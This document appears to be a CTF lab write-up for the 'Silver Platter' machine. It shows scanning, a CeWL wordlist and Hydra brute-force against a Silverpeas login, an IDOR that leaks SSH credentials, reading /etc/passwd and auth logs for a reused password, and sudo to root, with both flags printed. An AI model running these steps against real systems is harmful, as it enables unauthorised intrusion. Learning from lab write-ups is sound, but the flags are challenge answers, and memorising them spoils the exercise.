# CTF/Machine Info
## Context:

![[Pasted image 20250608155709.png|1000]]
## IP: 10.10.190.218

- Map IP to `sliverplatter.thm` in `/etc/hosts`.
---
# Scanning

## Nmap

```bash
nmap -p- -T5 -vv silverplatter.thm
Scanning 10.10.157.219 [65535 ports]
Discovered open port 80/tcp on 10.10.190.218
Discovered open port 8080/tcp on 10.10.190.218
Discovered open port 22/tcp on 10.10.190.218
```

```bash
nmap -p 22,80,8080 -A -T5 -vv -Pn silverplatter.thm

Discovered open port 80/tcp on 10.10.190.218
Discovered open port 8080/tcp on 10.10.190.218
Discovered open port 22/tcp on 10.10.190.218

PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1b:1c:87:8a:fe:34:16:c9:f7:82:37:2b:10:8f:8b:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ0ia1tcuNvK0lfuy3Ep2dsElFfxouO3VghX5Rltu77M33pFvTeCn9t5A8NReq3felAqPi+p+/0eRRfYuaeHRT4=
|   256 26:6d:17:ed:83:9e:4f:2d:f6:cd:53:17:c8:80:3d:09 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKecigNtiy6tW5ojXM3xQkbtTOwK+vqvMoJZnIxVowju

---------------------------------------------------------------------------------

80/tcp   open  http       syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Hack Smarter Security

---------------------------------------------------------------------------------

8080/tcp open  http-proxy syn-ack
|_http-title: Error
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Fri, 06 Jun 2025 02:46:49 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=6/5%Time=68425699%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close
SF:\r\nContent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Fri
SF:,\x2006\x20Jun\x202025\x2002:46:49\x20GMT\r\n\r\n<html><head><title>Err
SF:or</title></head><body>404\x20-\x20Not\x20Found</body></html>")%r(HTTPO
SF:ptions,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\r\n
SF:Content-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Fri,\x2
SF:006\x20Jun\x202025\x2002:46:49\x20GMT\r\n\r\n<html><head><title>Error</
SF:title></head><body>404\x20-\x20Not\x20Found</body></html>")%r(RTSPReque
SF:st,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nCo
SF:nnection:\x20close\r\n\r\n")%r(FourOhFourRequest,C9,"HTTP/1\.1\x20404\x
SF:20Not\x20Found\r\nConnection:\x20close\r\nContent-Length:\x2074\r\nCont
SF:ent-Type:\x20text/html\r\nDate:\x20Fri,\x2006\x20Jun\x202025\x2002:46:4
SF:9\x20GMT\r\n\r\n<html><head><title>Error</title></head><body>404\x20-\x
SF:20Not\x20Found</body></html>")%r(Socks5,42,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Gen
SF:ericLines,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x20
SF:0\r\nConnection:\x20close\r\n\r\n")%r(Help,42,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(
SF:SSLSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:
SF:\x200\r\nConnection:\x20close\r\n\r\n")%r(TerminalServerCookie,42,"HTTP
SF:/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x
SF:20close\r\n\r\n")%r(TLSSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Kerberos,
SF:42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConne
SF:ction:\x20close\r\n\r\n")%r(SMBProgNeg,42,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(LPDS
SF:tring,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\
SF:nConnection:\x20close\r\n\r\n")%r(LDAPSearchReq,42,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n
SF:");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---
# Enumeration

## FFUF (VHOST)

```bash
ffuf -w /home/n0derunnr/Documents/.wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.example.com" -u http://10.10.190.218

*NO VHOSTS/SUBDOMAINS FOUND*
```

## Gobuster (Forced Browsing)

```bash
gobuster dir -u http://10.10.190.218 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php,js,json,bak,zip

/index.html
/images
/assets
/README.txt

gobuster dir -u http://silverplatter.thm:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php,js,json,bak,zip

ERROR: context deadline exceeded while awaiting headers.
```

## Walking through `http://silverplatter.thm`

![[Pasted image 20250605231317.png|400]]
- Found searching `http://10.10.190.218`. Hyperlink to `http://10.10.190.218/#contract`.
	- Software: _Silverpeas_
	- Username: _scr1ptkiddy_

## Research: Silverpeas

![[Pasted image 20250605233055.png]]
- Found on installation page for Silverpeas for Docker.
- Default access is at `http://localhost:8080/silverpeas`.
- Sign in with default username and password: _SilverAdmin_

![[Pasted image 20250605233346.png]]

---
# Exploitation

## Password Spraying/Brute Force Authentication

![[Pasted image 20250608092209.png]]
- Back on the machine's information page, we have context that mentions testing passwords against _rockyou.txt_. This invites me to use a different list rather than rockyou.txt. The machine mentions that's how 'cool' they are in between quotes. Reference to CeWL: a custom wordlist generator that crawls a website, to a configurable depth, and extract key words, email addresses, and metadata.

```bash
cewl -w custom_passwords.txt silverplatter.thm
```

### Hydra

- `http://silverplatter.thm:8080/silverpeas/defaultLogin.jsp` could not be cracked with Hydra at the initial effort. 
	- `defaultLogin.jsp` is not the actual login handler — it’s the **front-end form**, a JSP page rendered to the user. When you submit the form from that page:
		- It does **not** process authentication itself.
		- Instead, it sends a POST request to a **backend servlet** (in this case, `AuthenticationServlet`) with `DomainId`, `Login`, and `Password` parameters.

Hydra only works when you point it at the **actual backend POST endpoint** where the credentials are validated.

```bash
hydra -l scr1ptkiddy -P custome_passwords.txt silverplatter.thm -s 8080 http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:Login or password incorrect" -V -t 2 -I

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-08 09:55:21
[DATA] max 2 tasks per 1 server, overall 2 tasks, 344 login tries (l:1/p:344), ~172 tries per task
[DATA] attacking http-post-form://silverplatter.thm:8080/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:Login or password incorrect
[ATTEMPT] target silverplatter.thm - login "scr1ptkiddy" - pass "the" - 1 of 344 [child 0] (0/0)
[ATTEMPT] target silverplatter.thm - login "scr1ptkiddy" - pass "Item" - 2 of 344 [child 1] (0/0)
[ATTEMPT] target silverplatter.thm - login "scr1ptkiddy" - pass "and" - 3 of 344 [child 1] (0/0)
[ATTEMPT] target silverplatter.thm - login "scr1ptkiddy" - pass "Hack" - 4 of 344 [child 0] (0/0)
[ATTEMPT] target silverplatter.thm - login "scr1ptkiddy" - pass "Smarter" - 5 of 344 [child 1] (0/0)
[ATTEMPT] target silverplatter.thm - login "scr1ptkiddy" - pass "Security" - 6 of 344 [child 0] (0/0)
[ATTEMPT] target silverplatter.thm - login "scr1ptkiddy" - pass "this" - 7 of 344 [child 0] (0/0)
[ATTEMPT] target silverplatter.thm - login "scr1ptkiddy" - pass "adipiscing" - 8 of 344 [child 1] (0/0)
[ATTEMPT] target silverplatter.thm - login "scr1ptkiddy" - pass "Default" - 9 of 344 [child 0] (0/0)
[8080][http-post-form] host: silverplatter.thm   login: scr1ptkiddy   password: adipiscing
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-08 09:55:27

```
- Password: adipiscing

### Burp Suite

Capturing a login request and sending it to Burp's Repeater tool can be used with the extension "Turbo Intruder" to bypass rate limiting on the community addition. FUZZ the desired parameter with the `%s` characters. Switch payload to basic.py and modify password list payload path.

![[Pasted image 20250608100906.png]]
- We see that 'adipiscing' is significantly content length and larger than the other passwords when brute forced. 

## IDOR Vulnerability

Upon logging into scr1ptkiddy, we have a notification for an unread message. 

![[Pasted image 20250608171358.png]]

Going into the mailbox and opening the message, we see that the URL has an ID parameter. Can we view other items?

![[Pasted image 20250608104458.png]]
- After copying and pasting the URL in the message into the browser and modifying the ID parameter, we find some interesting things.
- Starting at ID=1, we see an administrator account. This account is sending messages in French from ID 1-4. ID=5 is the message we have in our current inbox.
- ID=6 contains SSH credentials for the user `tim`. 
	- Password: `cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol`.

![[Pasted image 20250608104923.png|600]]

## Remote Access to the Web Server

```bash
ssh -l tim 10.10.210.42

Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jun  8 02:51:02 PM UTC 2025

  System load:  0.0               Processes:                124
  Usage of /:   89.9% of 8.33GB   Users logged in:          0
  Memory usage: 56%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for ens5:    10.10.210.42

  => / is using 89.9% of 8.33GB

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

39 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Dec 13 16:33:12 2023 from 192.168.1.20
```

# Post-Exploitation & Privilege Escalation

```bash
tim@silver-platter:~$ ls
user.txt
tim@silver-platter:~$ cat user.txt
THM{c4ca4238a0b923820dcc509a6f75849b}
tim@silver-platter:~$ 
```
- After dumping directory contents of user `tim`, we captured the first flag: `user.txt`.

>[!success] 🚩 **FLAG 1**: _THM{c4ca4238a0b923820dcc509a6f75849b}_

## Sudo Privileges/SUID Binaries

- Checking sudo privileges.
```bash
tim@silver-platter:~$ sudo -l
[sudo] password for tim: 
Sorry, user tim may not run sudo on silver-platter.
tim@silver-platter:~$ 
```

- Finding all binaries with SUID set.
```bash
tim@silver-platter:~$ find / -perm -4000 -type f 2>/dev/null
/snap/core20/2264/usr/bin/chfn /snap/core20/2264/usr/bin/chsh /snap/core20/2264/usr/bin/gpasswd /snap/core20/2264/usr/bin/mount /snap/core20/2264/usr/bin/newgrp /snap/core20/2264/usr/bin/passwd /snap/core20/2264/usr/bin/su /snap/core20/2264/usr/bin/sudo /snap/core20/2264/usr/bin/umount /snap/core20/2264/usr/lib/dbus-1.0/dbus-daemon-launch-helper /snap/core20/2264/usr/lib/openssh/ssh-keysign /snap/core20/1974/usr/bin/chfn /snap/core20/1974/usr/bin/chsh /snap/core20/1974/usr/bin/gpasswd /snap/core20/1974/usr/bin/mount /snap/core20/1974/usr/bin/newgrp /snap/core20/1974/usr/bin/passwd /snap/core20/1974/usr/bin/su /snap/core20/1974/usr/bin/sudo /snap/core20/1974/usr/bin/umount /snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper /snap/core20/1974/usr/lib/openssh/ssh-keysign /snap/snapd/20290/usr/lib/snapd/snap-confine /snap/snapd/19457/usr/lib/snapd/snap-confine /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/snapd/snap-confine /usr/bin/chsh /usr/bin/newgrp /usr/bin/fusermount3 /usr/bin/passwd /usr/bin/mount /usr/bin/gpasswd /usr/bin/sudo /usr/bin/su /usr/bin/chfn /usr/bin/pkexec /usr/bin/umount /usr/libexec/polkit-agent-helper-1
```

## User Account Enumeration:

```bash
tim@silver-platter:~$ id
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
```
- `adm` group may be worth looking into. Do security research on this security group.

![[Pasted image 20250608165510.png]]
- This immediate response off of Google entices me to see if user `tim` can review logs and see if there is any sensitive and valuable information.

```bash
tim@silver-platter:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
tyler:x:1000:1000:root:/home/tyler:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
tim:x:1001:1001::/home/tim:/bin/bash
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/
```

- A recognized name from enumerating the website and when going through the IDOR email vulnerability: 
	- `tyler:x:1000:1000:root:/home/tyler:/bin/bash`
	- User `tyler` is a lucrative user account to pivot to as they are part of root.

## Divulging Authentication Info via Logs

```bash
tim@silver-platter:~$ cd /var/log
tim@silver-platter:/var/log$ ls -la
total 2120
drwxrwxr-x  11 root      syslog            4096 Jun  8 20:40 .
drwxr-xr-x  14 root      root              4096 Dec 12  2023 ..
-rw-r--r--   1 root      root                 0 May  1  2024 alternatives.log
-rw-r--r--   1 root      root             34877 Dec 12  2023 alternatives.log.1
drwx------   3 root      root              4096 May  8  2024 amazon
drwxr-xr-x   2 root      root              4096 May  1  2024 apt
-rw-r-----   1 syslog    adm               1924 Jun  8 20:53 auth.log
-rw-r-----   1 syslog    adm               6356 Jun  8 20:40 auth.log.1
-rw-r-----   1 syslog    adm              32399 Dec 13  2023 auth.log.2
-rw-r-----   1 syslog    adm                755 May  8  2024 auth.log.2.gz
-rw-r--r--   1 root      root               600 May  8  2024 aws114_ssm_agent_installation.log
-rw-r--r--   1 root      root             64549 Aug 10  2023 bootstrap.log
-rw-rw----   1 root      utmp                 0 Jun  8 20:40 btmp
-rw-rw----   1 root      utmp               384 May  1  2024 btmp.1
-rw-r-----   1 syslog    adm             680197 Jun  8 20:40 cloud-init.log
-rw-r-----   1 root      adm              32825 Jun  8 20:40 cloud-init-output.log
drwxr-xr-x   2 root      root              4096 Aug  2  2023 dist-upgrade
-rw-r-----   1 root      adm              46954 Jun  8 20:40 dmesg
-rw-r-----   1 root      adm              45164 May  8  2024 dmesg.0
-rw-r-----   1 root      adm              14486 May  8  2024 dmesg.1.gz
-rw-r-----   1 root      adm              14519 May  8  2024 dmesg.2.gz
-rw-r-----   1 root      adm              14523 May  1  2024 dmesg.3.gz
-rw-r-----   1 root      adm              14543 Dec 13  2023 dmesg.4.gz
-rw-r--r--   1 root      root                 0 Jun  8 20:40 dpkg.log
-rw-r--r--   1 root      root               490 May  8  2024 dpkg.log.1
-rw-r--r--   1 root      root             50823 Dec 13  2023 dpkg.log.2.gz
-rw-r--r--   1 root      root             32064 Dec 13  2023 faillog
drwxr-x---   4 root      adm               4096 Dec 12  2023 installer
drwxr-sr-x+  3 root      systemd-journal   4096 Dec 12  2023 journal
-rw-r-----   1 syslog    adm               2844 Jun  8 20:40 kern.log
-rw-r-----   1 syslog    adm             185833 Jun  8 20:40 kern.log.1
-rw-r-----   1 syslog    adm              27571 May  8  2024 kern.log.2.gz
-rw-r-----   1 syslog    adm              82570 Dec 13  2023 kern.log.3.gz
drwxr-xr-x   2 landscape landscape         4096 Dec 12  2023 landscape
-rw-rw-r--   1 root      utmp            292584 Jun  8 20:53 lastlog
drwxr-xr-x   2 root      adm               4096 Jun  8 20:40 nginx
drwx------   2 root      root              4096 Aug 10  2023 private
-rw-r-----   1 syslog    adm              36654 Jun  8 20:57 syslog
-rw-r-----   1 syslog    adm             411973 Jun  8 20:40 syslog.1
-rw-r-----   1 syslog    adm              47656 May  8  2024 syslog.2.gz
-rw-r-----   1 syslog    adm             147601 May  1  2024 syslog.3.gz
-rw-r--r--   1 root      root                 0 Aug 10  2023 ubuntu-advantage.log
drwxr-x---   2 root      adm               4096 Jun  8 20:40 unattended-upgrades
-rw-rw-r--   1 root      utmp             26880 Jun  8 20:53 wtmp
```
- After dumping various authentication logs, we see some possible sensitive information through `auth.log.2`:
```bash
tim@silver-platter:/var/log$ cat auth.log.2
Dec 13 15:40:33 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
Dec 13 15:40:33 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
Dec 13 15:40:48 silver-platter sudo: pam_unix(sudo:session): session closed for user root
Dec 13 15:41:17 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker exec -it postgresql psql -U postgres
Dec 13 15:41:17 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
Dec 13 15:42:00 silver-platter sudo: pam_unix(sudo:session): session closed for user root
Dec 13 15:44:30 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database sivlerpeas:silverpeas-6.3.1
Dec 13 15:44:30 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
Dec 13 15:44:31 silver-platter sudo: pam_unix(sudo:session): session closed for user root
Dec 13 15:45:21 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:silverpeas-6.3.1
Dec 13 15:45:21 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
Dec 13 15:45:23 silver-platter sudo: pam_unix(sudo:session): session closed for user root
Dec 13 15:45:57 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:6.3.1
Dec 13 15:45:57 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
Dec 13 15:49:25 silver-platter sudo: pam_unix(sudo:session): session closed for user root
Dec 13 15:50:38 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/sbin/ufw allow 8080
Dec 13 15:50:38 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
Dec 13 15:50:39 silver-platter sudo: pam_unix(sudo:session): session closed for user root
Dec 13 15:51:13 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker ps
Dec 13 15:51:13 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
Dec 13 15:51:13 silver-platter sudo: pam_unix(sudo:session): session closed for user root
Dec 13 15:53:35 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/wget http://192.168.1.20/silverplatter.zip
Dec 13 15:53:35 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
Dec 13 15:53:35 silver-platter sudo: pam_unix(sudo:session): session closed for user root
```
- We see user `tyler` going through and updating passwords to various databases.
	- Password: `_Zd_zx7N823/`.

## Vertical Escalation

```bash
tim@silver-platter:~$ su tyler
Password: 
tyler@silver-platter:/home/tim$
```
- SUCCESS! We have logged in as `tyler`. Now we can check sudo privileges with `tyler`.
```bash
tyler@silver-platter:/home/tim$ sudo -l
Matching Defaults entries for tyler on silver-platter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tyler may run the following commands on silver-platter:
    (ALL : ALL) ALL
```
- We can simply switch to the root account with `sudo su`.
```bash
tyler@silver-platter:/home/tim$ sudo su
root@silver-platter:/home/tim# cd /root
root@silver-platter:~# cat root.txt 
THM{098f6bcd4621d373cade4e832627b4f6}
```

> [!success] 🚩 **FLAG 2**: _THM{098f6bcd4621d373cade4e832627b4f6}_





